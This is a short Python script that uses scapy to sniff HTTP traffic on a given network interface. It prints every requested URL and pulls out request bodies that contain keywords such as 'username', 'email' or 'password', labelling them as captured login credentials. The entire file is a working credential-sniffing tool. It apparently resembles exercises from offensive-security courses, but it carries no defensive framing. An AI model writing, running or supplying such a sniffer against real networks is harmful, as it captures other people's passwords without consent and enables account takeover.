#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse


def get_interface():
    parser = argparse.ArgumentParser()

    parser.add_argument("-i", "--interface", dest="interface", help="use this to set the interface")
    options = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify the network interface, use --help for more info")

    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username', 'uname', 'id', 'email', 'email-id', 'login', 'password', 'pass', "passwd"]

        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\nEntered login credentials >>> " + login_info + "\n\n")


network_interface = get_interface()
sniff(network_interface)
